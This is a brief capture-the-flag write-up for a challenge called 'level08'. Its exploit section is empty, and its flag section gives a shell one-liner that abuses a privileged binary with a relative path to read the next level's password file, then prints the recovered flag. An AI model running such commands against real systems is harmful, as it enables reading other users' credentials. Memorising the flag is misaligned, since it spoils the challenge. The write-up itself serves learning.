# level08



## **The exploit**



## **The flag**

We can condense our exploit into the following one-liner :

```
cd /tmp ; mkdir -p backups home/users/level09 ; /home/users/level08/level08 ../home/users/level09/.pass ; cat home/users/level09/.pass
```

We get the flag for `level08` :

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```